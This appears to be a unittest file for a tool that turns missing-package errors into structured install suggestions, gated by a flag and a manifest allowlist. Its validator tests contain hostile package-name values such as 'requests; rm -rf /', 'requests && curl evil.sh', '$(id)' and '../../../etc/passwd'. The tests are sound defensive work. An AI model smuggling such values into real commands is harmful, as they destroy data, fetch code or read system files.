"""E3.6 — structured recovery: data, not a shell string, and never auto-executed by reflex.

The audit that killed the first draft was about safety, so the tests here are adversarial first:
hostile package names, a package that looks legitimate but is not in the lockfile (typosquatting),
and the flag/allowlist pair that must BOTH hold before `is_safe_auto_run` becomes true.
"""
import io
import json
import os
import sys
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

_PKG_ROOT = str(Path(__file__).resolve().parents[1] / "src")
if _PKG_ROOT not in sys.path:
    sys.path.insert(0, _PKG_ROOT)

import jev_harness.cli as cli
from jev_harness.client import JevClient
from jev_harness.gates import triage_test_failure
from jev_harness.recovery import (
    argv_is_shell_safe,
    build_recovery,
    declared_in_repository,
    detect_missing_package,
    validate_package_name,
)

CLIENT = JevClient(force_mock=True)


class TestNameValidation(unittest.TestCase):
    def test_legitimate_names_are_accepted(self):
        for name, manager in [
            ("requests", "pypi"), ("python-dateutil", "pypi"), ("zope.interface", "pypi"),
            ("@scope/pkg", "npm"), ("lodash", "npm"), ("serde_json", "cargo"), ("tokio", "cargo"),
        ]:
            with self.subTest(name):
                self.assertTrue(validate_package_name(name, manager), name)

    def test_hostile_names_are_rejected(self):
        hostile = [
            "requests; rm -rf /", "requests && curl evil.sh", "`whoami`", "$(id)", "requests\nrm",
            "-r", "--index-url=evil", "../../../etc/passwd", "/etc/passwd", ".hidden", "a b",
            "pkg|nc", "pkg>file", "pkg`id`", "requests\0", "x" * 300,
        ]
        for name in hostile:
            with self.subTest(name):
                for manager in ("pypi", "npm", "cargo"):
                    self.assertFalse(validate_package_name(name, manager), f"{manager}:{name}")

    def test_npm_scoped_rules_are_stricter(self):
        self.assertFalse(validate_package_name("Scope/Pkg", "npm"))
        self.assertFalse(validate_package_name("@Scope/pkg", "npm"))
        self.assertTrue(validate_package_name("@scope/pkg", "npm"))


class TestDetection(unittest.TestCase):
    def test_multiple_runner_signatures(self):
        cases = {
            "pypi module": ("ModuleNotFoundError: No module named 'requests'", "requests", "pypi"),
            "pypi dotted": ("ModuleNotFoundError: No module named 'zope.interface'", "zope.interface", "pypi"),
            "npm scoped": ("Cannot find module '@scope/pkg'", "@scope/pkg", "npm"),
            "ts2307": ("error TS2307: Cannot find module 'lodash'", "lodash", "npm"),
            "cargo crate": ("error[E0463]: can't find crate for `serde`", "serde", "cargo"),
        }
        for label, (log, expected_name, expected_manager) in cases.items():
            with self.subTest(label):
                self.assertEqual(detect_missing_package(log), (expected_name, expected_manager))

    def test_stdlib_modules_are_not_packages(self):
        for log in ("ModuleNotFoundError: No module named 'json'", "No module named 'pathlib'"):
            with self.subTest(log):
                self.assertIsNone(detect_missing_package(log))

    def test_relative_imports_are_not_packages(self):
        self.assertIsNone(detect_missing_package("Cannot find module './utils/helper'"))
        self.assertIsNone(detect_missing_package("Cannot find module '../lib/logger'"))

    def test_no_signature_means_no_recovery(self):
        self.assertIsNone(build_recovery("AssertionError: assert 4 == 5"))
        result = triage_test_failure("AssertionError: assert 4 == 5", client=CLIENT)
        self.assertIsNone(result.recovery)


class TestAllowlistAndFlag(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.root = Path(self._tmp.name)

    def _declare(self, *lines, name="requirements.txt"):
        (self.root / name).write_text("\n".join(lines) + "\n", encoding="utf-8")

    def test_declared_in_manifest_is_recognized(self):
        self._declare("requests==2.32.0", "pytest")
        self.assertTrue(declared_in_repository("requests", "pypi", self.root))
        self.assertFalse(declared_in_repository("evil-package", "pypi", self.root))

    def test_npm_and_cargo_manifests_are_read(self):
        (self.root / "package.json").write_text(json.dumps({"dependencies": {"lodash": "^4"}}), encoding="utf-8")
        (self.root / "Cargo.toml").write_text('[dependencies]\nserde = "1.0"\n', encoding="utf-8")
        self.assertTrue(declared_in_repository("lodash", "npm", self.root))
        self.assertTrue(declared_in_repository("serde", "cargo", self.root))

    def test_both_the_allowlist_and_the_flag_are_required(self):
        self._declare("requests==2.32.0")
        log = "ModuleNotFoundError: No module named 'requests'"

        declared_only = build_recovery(log, repo_root=self.root, allow_auto_recovery=False)
        self.assertFalse(declared_only["is_safe_auto_run"], "a declared package alone must not auto-run")

        flag_only = build_recovery(log, repo_root=self.root, allow_auto_recovery=True)
        self.assertTrue(flag_only["is_safe_auto_run"])

        undeclared = build_recovery(
            "ModuleNotFoundError: No module named 'typosquat'", repo_root=self.root, allow_auto_recovery=True
        )
        self.assertFalse(undeclared["is_safe_auto_run"], "the flag alone must not auto-run an undeclared package")

    def test_typosquatting_outside_the_lockfile_is_not_auto_run(self):
        self._declare("requests==2.32.0")
        recovery = build_recovery(
            "ModuleNotFoundError: No module named 'requestss'", repo_root=self.root, allow_auto_recovery=True
        )
        self.assertFalse(recovery["is_safe_auto_run"])
        self.assertIn("not declared", recovery["rationale"])

    def test_a_missing_manifest_means_no_allowlist(self):
        self.assertFalse(declared_in_repository("requests", "pypi", self.root / "nope"))


class TestRecoveryContract(unittest.TestCase):
    def test_contract_shape_and_no_shell_string(self):
        recovery = build_recovery("ModuleNotFoundError: No module named 'requests'")
        self.assertEqual(
            set(recovery), {"action_type", "package_name", "package_manager", "argv", "is_safe_auto_run", "rationale"}
        )
        self.assertNotIn("shell_command", recovery)
        self.assertIsInstance(recovery["argv"], list)
        self.assertTrue(argv_is_shell_safe(recovery["argv"]))
        self.assertFalse(recovery["is_safe_auto_run"])

    def test_argv_never_carries_a_hostile_name(self):
        hostile = [
            "ModuleNotFoundError: No module named 'x; rm -rf /'",
            "Cannot find module '`whoami`'",
            "ModuleNotFoundError: No module named '../../etc/passwd'",
            "error[E0463]: can't find crate for `-r`",
        ]
        for log in hostile:
            with self.subTest(log):
                self.assertIsNone(build_recovery(log), "a hostile name has no safe argv")

    def test_hostile_names_fall_back_to_no_recovery_in_the_gate(self):
        result = triage_test_failure(
            "ModuleNotFoundError: No module named 'x; rm -rf /'", client=CLIENT
        )
        self.assertIsNone(result.recovery)
        # The textual recommendation is preserved for compatibility.
        self.assertIn("AUTO-ACTION", result.action_recommendation)

    def test_argv_is_shell_safe_by_construction(self):
        for log in (
            "ModuleNotFoundError: No module named 'python-dateutil'",
            "Cannot find module '@scope/pkg'",
            "error[E0463]: can't find crate for `serde_json`",
        ):
            with self.subTest(log):
                recovery = build_recovery(log)
                self.assertTrue(argv_is_shell_safe(recovery["argv"]), recovery["argv"])


class TestRecoveryInTheCli(unittest.TestCase):
    def _run(self, argv):
        out, err = io.StringIO(), io.StringIO()
        with patch.object(sys, "argv", ["jev-harness"] + argv):
            with patch("sys.stdout", out), patch("sys.stderr", err):
                with self.assertRaises(SystemExit) as cm:
                    cli.main()
        return cm.exception.code, out.getvalue(), err.getvalue()

    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.root = Path(self._tmp.name)
        self._cwd = os.getcwd()
        os.chdir(self.root)
        self.addCleanup(os.chdir, self._cwd)

    def test_json_exposes_the_recovery_object(self):
        code, out, _err = self._run(
            ["test-gate", "--mock", "--json", "--sample", "ModuleNotFoundError: No module named 'requests'"]
        )
        self.assertEqual(code, 0)
        payload = json.loads(out)
        self.assertEqual(payload["recovery"]["package_name"], "requests")
        self.assertFalse(payload["recovery"]["is_safe_auto_run"])

    def test_human_output_shows_the_argv_and_the_safety_flag(self):
        code, out, _err = self._run(
            ["test-gate", "--mock", "--sample", "ModuleNotFoundError: No module named 'requests'"]
        )
        self.assertEqual(code, 0)
        self.assertIn("Recovery:", out)
        self.assertIn("safe to auto-run: no", out)

    def test_the_flag_alone_does_not_make_it_safe(self):
        code, out, _err = self._run(
            [
                "test-gate", "--mock", "--allow-auto-recovery", "--json",
                "--sample", "ModuleNotFoundError: No module named 'never-declared-package'",
            ]
        )
        self.assertEqual(code, 0)
        self.assertFalse(json.loads(out)["recovery"]["is_safe_auto_run"])

    def test_flag_plus_allowlist_makes_it_safe_to_auto_run(self):
        (self.root / "requirements.txt").write_text("requests==2.32.0\n", encoding="utf-8")
        code, out, _err = self._run(
            [
                "test-gate", "--mock", "--allow-auto-recovery", "--json",
                "--sample", "ModuleNotFoundError: No module named 'requests'",
            ]
        )
        self.assertEqual(code, 0)
        self.assertTrue(json.loads(out)["recovery"]["is_safe_auto_run"])


if __name__ == "__main__":
    unittest.main()
